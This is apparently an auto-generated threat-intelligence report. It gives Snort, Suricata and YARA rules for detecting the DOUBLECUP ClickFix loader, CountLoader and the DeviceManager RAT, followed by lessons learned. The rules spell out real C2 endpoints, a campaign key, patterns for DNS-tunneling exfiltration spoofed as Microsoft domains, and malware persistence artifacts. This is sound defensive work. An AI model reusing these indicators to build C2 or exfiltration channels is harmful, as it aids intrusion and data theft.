### Snort: DOUBLECUP C2 Session Registration

Detects DOUBLECUP C2 session registration HTTP requests to `/session/reg` with session ID and IP parameters. Snort not installed -- structural check only.
**Status:** compile ⚠️ uncompiled (Snort not installed) · confidence: medium
<!-- audit: Snort 3 not installed in this environment. Structural validation: uses http service, http_method/http_uri sticky buffers, proper flow, sid in 2100000+ range, all options semicolon-terminated. REVISION: downgraded confidence from high to medium — /session/reg is a generic URI pattern that could match legitimate session management APIs. -->
```snort
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"DOUBLECUP C2 Session Registration"; flow:established, to_server; http_method; content:"GET"; http_uri; content:"/session/reg", fast_pattern; content:"sid="; content:"ip="; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created 2026-08-07; sid:2100101; rev:1;)
```

### Snort: CountLoader C2 Beacon with Campaign Key

Detects CountLoader C2 initial beacon to `/connect` containing the campaign tracking key `K94DGQ99VYCCH52TKOT2`. Snort not installed -- structural check only.
**Status:** compile ⚠️ uncompiled (Snort not installed) · confidence: high
<!-- audit: Snort 3 not installed. Structural check: http service, http_method/http_uri sticky buffers, flow established to_server, unique sid 2100102. K94DGQ99VYCCH52TKOT2 is the published campaign key from CountLoader 4.5p — highly specific, no known benign use. -->
```snort
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"CountLoader C2 Beacon with Campaign Key K94DGQ99VYCCH52TKOT2"; flow:established, to_server; http_method; content:"GET"; http_uri; content:"/connect", fast_pattern; content:"key=K94DGQ99VYCCH52TKOT2"; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created 2026-08-07; sid:2100102; rev:1;)
```

### Suricata: DeviceManager DNS Tunneling Check-in via Spoofed Microsoft Domain

Detects DeviceManager RAT DNS tunneling check-in queries matching the pattern `{16-hex-char-hash}{tag}.microsoft.com`, with threshold to reduce false positives from legitimate Microsoft DNS.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: suricata -T exit 0. The PCRE anchors on 16 hex chars followed by variable content ending in .microsoft.com — matches the DeviceManager check-in pattern. Threshold of 5/120s reduces FP from legitimate Microsoft subdomains. Medium confidence due to potential overlap with legitimate long-subdomain Microsoft queries; tune threshold per environment. -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - DeviceManager RAT DNS Tunneling Check-in via Spoofed Microsoft Domain"; flow:to_server; dns.query; content:".microsoft.com"; endswith; nocase; pcre:"/^[a-f0-9]{16}[a-z0-9\-]*\.microsoft\.com$/i"; threshold:type both, track by_src, count 5, seconds 120; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-07; sid:2200101; rev:1;)
```

### Suricata: DeviceManager DNS TXT System Info Exfiltration

Detects DeviceManager RAT DNS TXT queries for system information exfiltration matching the pattern `i-{device_hash}-{info_hex}.microsoft.com`.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. The "i-" prefix followed by 16 hex chars, dash, then hex data ending in .microsoft.com is the exact published system info exfiltration pattern. Highly specific — legitimate Microsoft subdomains do not start with "i-" followed by 16 hex chars. -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - DeviceManager RAT DNS TXT System Info Exfil Pattern"; flow:to_server; dns.query; content:"i-"; startswith; content:".microsoft.com"; endswith; nocase; pcre:"/^i-[a-f0-9]{16}-[a-f0-9]+\.microsoft\.com$/i"; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-07; sid:2200102; rev:1;)
```

### Suricata: DeviceManager DNS TXT Task Polling

Detects DeviceManager RAT DNS TXT queries for task polling matching the pattern `t-{device_hash}-{process_id}.microsoft.com`.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. The "t-" prefix followed by 16 hex chars and a process ID ending in .microsoft.com is the exact published task polling pattern. No known legitimate Microsoft subdomain uses this format. -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - DeviceManager RAT DNS TXT Task Polling Pattern"; flow:to_server; dns.query; content:"t-"; startswith; content:".microsoft.com"; endswith; nocase; pcre:"/^t-[a-f0-9]{16}-[0-9]+\.microsoft\.com$/i"; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-07; sid:2200103; rev:1;)
```

### Suricata: DOUBLECUP C2 Session Registration

Detects DOUBLECUP C2 HTTP session registration requests to `/session/reg` with session ID and IP parameters.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: suricata -T exit 0. REVISION: downgraded confidence from high to medium — /session/reg is a generic URI pattern that could match legitimate session management APIs. The combination with sid= and ip= adds some specificity but is not unique to DOUBLECUP. -->
```suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - DOUBLECUP C2 Session Registration Endpoint"; flow:established,to_server; http.method; content:"GET"; http.uri; content:"/session/reg"; fast_pattern; content:"sid="; content:"ip="; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-07; sid:2200104; rev:1;)
```

### Suricata: DOUBLECUP C2 Session Signal

Detects DOUBLECUP C2 HTTP POST to `/session/signal` confirming Stage 1 payload execution on the victim.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. POST to /session/signal with sid= is the exact published DOUBLECUP infection confirmation endpoint. -->
```suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - DOUBLECUP C2 Session Signal Endpoint"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/session/signal"; fast_pattern; content:"sid="; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-07; sid:2200105; rev:1;)
```

### Suricata: CountLoader C2 Beacon with Campaign Key

Detects CountLoader 4.5p initial beacon to `/connect` containing the campaign tracking key `K94DGQ99VYCCH52TKOT2`.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. K94DGQ99VYCCH52TKOT2 is the published CountLoader campaign tracking key — highly specific alphanumeric string with no known benign use. -->
```suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - CountLoader C2 Initial Beacon with Campaign Key"; flow:established,to_server; http.method; content:"GET"; http.uri; content:"/connect"; fast_pattern; content:"hwid="; content:"key=K94DGQ99VYCCH52TKOT2"; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-07; sid:2200107; rev:1;)
```

### Suricata: CountLoader C2 Task Retrieval

Detects CountLoader C2 HTTP POST to `/getUpdates` for command retrieval.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: suricata -T exit 0. REVISION: downgraded confidence from high to medium — /getUpdates is a standard Telegram Bot API endpoint pattern. While CountLoader uses this path, it will produce false positives in environments with legitimate Telegram bot integrations. -->
```suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - CountLoader C2 Task Retrieval via getUpdates"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/getUpdates"; fast_pattern; http.request_body; content:"getUpdates"; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-07; sid:2200108; rev:1;)
```

### YARA: DOUBLECUP Steganographic PNG Marker

Detects PNG files containing the `ZZ1984` steganographic extraction marker used by DOUBLECUP to embed payloads in browser-cached images.
**Status:** compile ✅ compiles · confidence: high · sample: not validated
<!-- audit: yarac exit 0. REVISION: relabeled sample status from "fired" to "not validated" — previous test used a constructed sample, not a real DOUBLECUP steganographic PNG. ZZ1984 is the published extraction marker from SOCRadar analysis — grounded in the source, not invented. -->
```yara
rule Malware_DOUBLECUP_Steganographic_PNG_Marker
{
    meta:
        description = "Detects steganographic PNG files used by DOUBLECUP loader containing the ZZ1984 extraction marker string"
        author = "Actioner"
        date = "2026-08-07"
        reference = "https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/"
        severity = "critical"
        tlp = "WHITE"

    strings:
        $png_header = { 89 50 4E 47 0D 0A 1A 0A }
        $marker = "ZZ1984" ascii

    condition:
        $png_header at 0 and
        $marker and
        filesize < 5MB
}
```

### YARA: CountLoader 4.5p Windows Variant

Detects CountLoader 4.5p via the campaign tracking key `K94DGQ99VYCCH52TKOT2`, version string, C2 endpoints, and XOR obfuscation characteristics.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: yarac exit 0. K94DGQ99VYCCH52TKOT2 is the published campaign key; condition requires 3+ of key/version/C2 endpoints or key+2 obfuscation artifacts — high specificity. SHA256 hash bdf28e611d... from SOCRadar report pinned in meta. -->
```yara
rule Malware_CountLoader_45p_Windows
{
    meta:
        description = "Detects CountLoader 4.5p Windows PowerShell variant via campaign tracking key, version string, and characteristic C2 parameters"
        author = "Actioner"
        date = "2026-08-07"
        reference = "https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/"
        hash = "bdf28e611d77362c40a0445655a35943c03accf21bb9a5af755da7eac5ea5e40"
        severity = "critical"
        tlp = "WHITE"

    strings:
        $key = "K94DGQ99VYCCH52TKOT2" ascii wide
        $ver = "4.5p" ascii wide
        $c2_connect = "/connect" ascii wide
        $c2_updates = "/getUpdates" ascii wide
        $c2_approve = "/approveUpdate" ascii wide
        $xor_63 = "-bxor 63" ascii wide nocase
        $python_embed = "python-3.13.13-embed-amd64" ascii wide
        $irm_iex = "irm" ascii wide
        $schtask_google = "GoogleUpdateService" ascii wide
        $schtask_edge = "MSEdgeUpdateService" ascii wide

    condition:
        (3 of ($key, $ver, $c2_*)) or
        ($key and 2 of ($xor_63, $python_embed, $irm_iex)) or
        ($key and any of ($schtask_*))
}
```

### YARA: DeviceManager RAT

Detects DeviceManager RAT via blockchain smart contract addresses, function selectors, DNS tunneling patterns, and WMI persistence artifact names.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: yarac exit 0. Smart contract address 0xc027490AF56a9d7050fc259Ecd03DA1580b84aae and Ethereum address 0xCE17b1EF00d47105Bc127BbE6fC45dE47BC22fb8 are highly unique identifiers. Function selectors 0x1dcf296b/0xc474520d/0x71c28139 are 4-byte values but requiring 2+ reduces FP. Alternative conditions cross-reference task names with WMI/config artifacts. SHA256 hashes from SOCRadar report. -->
```yara
rule Malware_DeviceManager_RAT
{
    meta:
        description = "Detects DeviceManager RAT Python source or compiled variant via characteristic blockchain C2 resolution, DNS tunneling, and configuration artifacts"
        author = "Actioner"
        date = "2026-08-07"
        reference = "https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/"
        hash = "ea70895620f955b0712b85c3fee41de7437d5068267966f0b4fb6fa2704c3a50"
        severity = "critical"
        tlp = "WHITE"

    strings:
        $contract = "0xc027490AF56a9d7050fc259Ecd03DA1580b84aae" ascii wide nocase
        $eth_addr = "0xCE17b1EF00d47105Bc127BbE6fC45dE47BC22fb8" ascii wide nocase
        $func_sel_get = "0x1dcf296b" ascii wide
        $func_sel_upd = "0xc474520d" ascii wide
        $func_sel_tgt = "0x71c28139" ascii wide
        $dns_spoof = ".microsoft.com" ascii wide
        $task_name = "MicroUpdaterV1" ascii wide
        $wmi_filter = "PythonAppUpdateFilter" ascii wide
        $wmi_consumer = "PythonAppUpdateConsumer" ascii wide
        $wmi_timer = "PythonAppTimer_600" ascii wide
        $config_path = "DeviceManager" ascii wide
        $agent_log = "agent.log" ascii wide
        $agent_main = "agent_main.pyw" ascii wide
        $blockchain_key = "blockchain_key" ascii wide
        $chacha20 = "ChaCha20" ascii wide nocase

    condition:
        any of ($contract, $eth_addr) or
        (2 of ($func_sel_*)) or
        ($task_name and 2 of ($wmi_*, $config_path, $agent_*, $blockchain_key, $chacha20)) or
        ($dns_spoof and $blockchain_key and any of ($agent_*))
}
```

### YARA: DeviceManager Inno Setup Installer

Detects the DeviceManager RAT Delphi-compiled Inno Setup installer via the characteristic `Microsoft.PythonApp_yadfiy2x1ep12` installation path or IPC flag pattern with associated artifacts.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: yarac exit 0. Microsoft.PythonApp_yadfiy2x1ep12 is the exact published installation directory — a fabricated Windows Store app path with a unique package family suffix. /SL5= is the Inno Setup IPC flag; combined with run.pyw + MicroUpdaterV1 it is highly specific. SHA256 hash 6e08cb56... from SOCRadar report. -->
```yara
rule Malware_DeviceManager_InnoSetup_Installer
{
    meta:
        description = "Detects the DeviceManager RAT Delphi-compiled Inno Setup installer via characteristic IPC flag pattern and installation paths"
        author = "Actioner"
        date = "2026-08-07"
        reference = "https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/"
        hash = "6e08cb5602f63bee2b40739167b4aef77763bc8fb47b4839ca2fc1607ad35cba"
        severity = "high"
        tlp = "WHITE"

    strings:
        $inno_ipc = "/SL5=" ascii wide
        $python_app = "Microsoft.PythonApp_yadfiy2x1ep12" ascii wide
        $run_pyw = "run.pyw" ascii wide
        $micro_updater = "MicroUpdaterV1" ascii wide

    condition:
        uint16(0) == 0x5A4D and
        filesize < 15MB and
        ($python_app or
        ($inno_ipc and $run_pyw and $micro_updater))
}
```

### YARA: DOUBLECUP Client Agent

Detects the DOUBLECUP operator client agent via its characteristic C2 session management endpoints and steganographic image reference.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: yarac exit 0. Requiring 3+ of the 5 DOUBLECUP-specific session/API endpoints provides high specificity. These URI patterns (/session/reg, /session/check, /session/signal, /api/config, stego-image) are published from the SOCRadar analysis and are distinctive to the DOUBLECUP service. SHA256 hashes 882914f9... and 8585721c... from SOCRadar report. -->
```yara
rule Malware_DOUBLECUP_Client_Agent
{
    meta:
        description = "Detects the DOUBLECUP client agent used by operators to manage ClickFix campaigns and payload delivery"
        author = "Actioner"
        date = "2026-08-07"
        reference = "https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/"
        hash = "882914f9014f14e89123e835f103ac8f9d4b2e358c1f21c1cbc7f1054e6afed6"
        severity = "critical"
        tlp = "WHITE"

    strings:
        $session_reg = "/session/reg" ascii wide
        $session_check = "/session/check" ascii wide
        $session_signal = "/session/signal" ascii wide
        $api_config = "/api/config" ascii wide
        $stego_image = "stego-image" ascii wide

    condition:
        3 of ($session_*, $api_config, $stego_image)
}
```

## Lessons Learned

1. **ClickFix as a service platform lowers the barrier to entry:** DOUBLECUP demonstrates the commoditization of social engineering delivery mechanisms, enabling operators without deep technical skills to launch sophisticated multi-stage campaigns. The service model -- complete with licensing, Telegram bot management, and automatic payload rebuilding -- mirrors legitimate SaaS business models applied to malware delivery.

2. **Browser cache as a staging area is a novel evasion vector:** By using the browser's own cache mechanism to store steganographic payloads, DOUBLECUP leverages a trusted storage location that bypasses many endpoint detection solutions focused on traditional download paths. The extraction via legitimate LOLBins (findstr, certutil) further complicates detection.

3. **Environmental keying defeats traditional sandbox analysis:** Using the victim's public IP address as a cryptographic key for payload decryption means researchers cannot analyze the final payload without either being on the victim's network or spoofing their IP -- a significant barrier to analysis at scale.

4. **Blockchain-based C2 resolution is increasingly adopted:** DeviceManager's use of Ethereum/Polygon smart contracts for C2 resolution (EtherHiding) represents a growing trend that makes infrastructure takedown nearly impossible. Combined with DNS tunneling spoofed as Microsoft telemetry, this creates a resilient and stealthy C2 channel.

## Sources

- [SOCRadar - Introducing DOUBLECUP, a ClickFix Loader Delivering CountLoader and DeviceManager RATs](https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/) -- primary technical analysis by SOCRadar Threat Research Unit (STRU)
- [The Hacker News - DOUBLECUP Uses ClickFix and Cached PNGs to Deliver CountLoader and DeviceManager RAT](https://thehackernews.com/2026/08/doublecup-uses-clickfix-and-cached-pngs.html) -- secondary coverage
- [BleepingComputer - New DOUBLECUP ClickFix service hides malware in browser cache images](https://www.bleepingcomputer.com/news/security/new-doublecup-clickfix-service-hides-malware-in-browser-cache-images/) -- secondary coverage

---
*Report generated by Actioner*
